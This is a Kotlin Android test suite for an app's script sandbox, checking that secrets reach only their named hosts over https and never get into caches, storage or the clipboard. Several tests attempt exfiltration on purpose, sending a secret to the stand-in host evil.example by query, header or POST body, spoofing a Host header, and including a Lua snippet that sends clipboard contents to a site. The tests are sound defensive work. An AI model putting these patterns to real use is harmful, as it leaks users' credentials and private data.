package com.mtwabpin.kolahal.script

import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import com.mtwabpin.kolahal.data.ScriptLang
import com.mtwabpin.kolahal.data.KvStore
import com.mtwabpin.kolahal.data.ScriptRepository
import okhttp3.HttpUrl.Companion.toHttpUrl
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test
import org.junit.runner.RunWith

/**
 * A script never holds a secret's value: secrets.get gives a mark, and only a request to a site the
 * `@secret` line names, over https, carries the value in its place.
 */
@RunWith(AndroidJUnit4::class)
class ScriptSecretsTest {
    private val context = InstrumentationRegistry.getInstrumentation().targetContext
    private val scripts = ScriptRepository.get(context)
    private val store = SecretStore(context)
    private val value = "s3cr3t-value-123"
    private val key = ScriptMeta.Secret("KEY", listOf("api.example.com"), "")

    @After fun tearDown() {
        scripts.byName("secrets-test")?.let { scripts.delete(it.id) }
        store.clear("secrets-test")
    }

    private fun host() = HostApi(
        context, "secrets-test", scriptId = null, notifyEnabled = false,
        secrets = HostApi.Secrets(listOf(key), mapOf("KEY" to value)),
    )

    private inline fun <reified T : Throwable> refused(what: String, block: () -> Unit) {
        try {
            block()
            fail("expected a refusal: $what")
        } catch (e: Throwable) {
            assertTrue("$e", e is T && e.message.orEmpty().contains(what))
        }
    }

    @Test fun aScriptGetsAMarkNotTheValue() {
        val h = host()
        val mark = h.secretGet("KEY")!!
        assertFalse(value in mark)
        assertTrue(mark, mark.startsWith("__kolahal_secret_KEY_"))
        // Shown anywhere, it is masked like a value.
        assertEquals("Bearer ••••", h.redact("Bearer $mark"))
        assertEquals("••••", h.redact(value))
        // Unset: nil, as before.
        assertNull(HostApi(context, "secrets-test", null, false, secrets = HostApi.Secrets(listOf(key), emptyMap())).secretGet("KEY"))
    }

    @Test fun theValueGoesInOnlyForItsSiteOverHttps() {
        val h = host()
        val mark = h.secretGet("KEY")!!
        assertEquals("Bearer $value", h.fillSecrets("Bearer $mark", "https://api.example.com/user".toHttpUrl()))
        assertEquals("k=$value", h.fillSecrets("k=$mark", "https://eu.api.example.com/".toHttpUrl()))
        refused<java.io.IOException>("may only be sent to") { h.fillSecrets("k=$mark", "https://evil.example/".toHttpUrl()) }
        refused<java.io.IOException>("over https") { h.fillSecrets("k=$mark", "http://api.example.com/".toHttpUrl()) }
        // Changed or hidden, a mark is just text: the value never goes in.
        val reversed = mark.reversed()
        assertEquals(reversed, h.fillSecrets(reversed, "https://evil.example/".toHttpUrl()))
    }

    /** Requests are refused before anything is sent. */
    @Test fun requestsCarryingAMarkElsewhereAreRefused() {
        val h = host()
        val mark = h.secretGet("KEY")!!
        refused<java.io.IOException>("may only be sent to") { h.httpGet("https://evil.example/?k=$mark") }
        refused<java.io.IOException>("may only be sent to") { h.httpGet("https://evil.example/", mapOf("Authorization" to "Bearer $mark")) }
        refused<java.io.IOException>("over https") { h.httpGet("http://api.example.com/?k=$mark") }
        refused<IllegalArgumentException>("Host header") { h.httpGet("https://api.example.com/", mapOf("Host" to "evil.example")) }
        refused<java.io.IOException>("may only be sent to") {
            h.httpRequest("https://evil.example/", method = "POST", body = "{\"k\":\"$mark\"}")
        }
    }

    /** Answers every request with [body], on this phone, for [block] to fetch; [answering] runs as each request is read. */
    private fun serving(body: String, answering: () -> Unit = {}, block: (String) -> Unit) {
        val socket = java.net.ServerSocket(0, 50, java.net.InetAddress.getByName("127.0.0.1"))
        kotlin.concurrent.thread(isDaemon = true) {
            while (!socket.isClosed) {
                val client = runCatching { socket.accept() }.getOrNull() ?: break
                client.use { c ->
                    val reader = c.getInputStream().bufferedReader()
                    while (reader.readLine()?.isNotEmpty() == true) Unit
                    answering()
                    val bytes = body.toByteArray()
                    c.getOutputStream().write("HTTP/1.1 200 OK\r\nContent-Length: ${bytes.size}\r\nConnection: close\r\n\r\n".toByteArray() + bytes)
                }
            }
        }
        val url = "http://127.0.0.1:${socket.localPort}/"
        try {
            block(url)
        } finally {
            socket.close()
            listOf("http.cache:", "rss.seen:").forEach { KvStore(context, "repl").deleteStartingWith(it) }
        }
    }

    /** A store goes into backups: a site sending the key back must not put it there. */
    @Test fun aResponseHoldingASecretIsntCached() {
        val body = "{\"next\":\"https://api.example.com/?key=$value\"}"
        serving(body) { url ->
            val h = host()
            assertEquals(body, h.httpCached(url, 60)["body"])
            assertNull(h.storeGet("http.cache:$url"))
            assertEquals(false, h.httpCached(url, 60)["cached"])
        }
        serving("{\"plain\":1}") { url ->
            val h = host()
            h.httpCached(url, 60)
            assertEquals(true, h.httpCached(url, 60)["cached"])
        }
    }

    /** An answer that comes once the run has ended (JavaScript's http.cached, not awaited) isn't kept. */
    @Test fun anAnswerAfterTheRunEndedIsntCached() {
        val asked = java.util.concurrent.CountDownLatch(1)
        val ended = java.util.concurrent.CountDownLatch(1)
        serving("{\"late\":1}", answering = { asked.countDown(); ended.await(5, java.util.concurrent.TimeUnit.SECONDS) }) { url ->
            val h = host()
            val call = kotlin.concurrent.thread { runCatching { h.httpCached(url, 60) } }
            assertTrue(asked.await(5, java.util.concurrent.TimeUnit.SECONDS))
            h.finish()
            ended.countDown()
            call.join(5_000)
            // Finished, so nothing it does can land after the check.
            assertFalse("the request never ended", call.isAlive)
            assertNull(KvStore(context, "repl").get("http.cache:$url"))
        }
    }

    /** One kept before these stayed out goes the next time the script asks, fresh or not, and isn't handed back. */
    @Test fun aResponseCachedWithASecretGoes() {
        val plain = "{\"plain\":1}"
        serving(plain) { url ->
            val h = host()
            val kept = KvStore(context, "repl")
            kept.set("http.cache:$url", Json.stringify(mapOf("at" to System.currentTimeMillis(), "body" to "key=$value")))
            val answer = h.httpCached(url, 60)
            assertEquals(false, answer["cached"])
            assertEquals(plain, answer["body"])
            assertTrue(!kept.get("http.cache:$url").orEmpty().contains(value))
        }
    }

    @Test fun aFeedItemsSecretIsMaskedAndTheItemStillSeen() {
        val rss = "<rss version=\"2.0\"><channel><title>t</title><item><title>a</title>" +
            "<link>https://example.com/a?token=$value</link><guid>https://example.com/a?token=$value</guid></item></channel></rss>"
        serving(rss) { url ->
            val first = host()
            assertEquals(1, (first.rssFresh(url)["items"] as List<*>).size)
            first.commit()
            val stored = first.storeGet("rss.seen:$url").orEmpty()
            assertFalse(stored, stored.contains(value))
            assertTrue(stored, stored.contains("••••"))
            assertEquals("seen by the next run", 0, (host().rssFresh(url)["items"] as List<*>).size)
        }
    }

    @Test fun clipboardAndStoreNeverTakeASecret() {
        val h = host()
        val mark = h.secretGet("KEY")!!
        refused<IllegalArgumentException>("secrets") { h.clipboardSet("key: $mark") }
        refused<IllegalArgumentException>("secrets") { h.clipboardSet("key: $value") }
        refused<IllegalArgumentException>("secrets") { h.storeSet("k", mark) }
        refused<IllegalArgumentException>("secrets") { h.storeSet(value, "v") }
    }

    /** New code without an `@secret` line forgets its value instead of keeping it unseen. */
    @Test fun aRemovedSecretIsForgotten() {
        val two = "-- @secret A api.example.com one\n-- @secret B api.example.com two\nreturn 1"
        val s = scripts.create("secrets-test", ScriptLang.LUA, two)
        val (a, b) = ScriptMeta.secrets(two)
        store.set(s.name, "A", "value-aaaa", a.hosts)
        store.set(s.name, "B", "value-bbbb", b.hosts)
        scripts.saveCode(s.id, "-- @secret A api.example.com one\nreturn 1", byUser = true)
        assertNotNull(store.get(s.name, "A"))
        assertNull(store.get(s.name, "B"))
    }

    /** Code you didn't write that starts making requests starts with the internet off, and says so. */
    @Test fun anUpdateThatGoesOnlineStartsWithInternetOff() {
        val s = scripts.create("secrets-test", ScriptLang.LUA, "-- @uses clipboard\nreturn clipboard.get()")
        scripts.setAccess(s.id, "clipboard", true)
        scripts.saveCode(s.id, "-- @uses clipboard\nreturn http.get('https://example.com/?c=' .. clipboard.get())")
        assertFalse(scripts.byId(s.id)!!.grants.allows(ScriptAccess.INTERNET))
        scripts.setAccess(s.id, ScriptAccess.INTERNET, true)
        assertTrue(scripts.byId(s.id)!!.grants.allows(ScriptAccess.INTERNET))
        // Your own edit keeps it on.
        val mine = scripts.create("secrets-test-2", ScriptLang.LUA, "return 1")
        scripts.saveCode(mine.id, "return http.get('https://example.com/')", byUser = true)
        assertTrue(scripts.byId(mine.id)!!.grants.allows(ScriptAccess.INTERNET))
        scripts.delete(mine.id)
    }
}
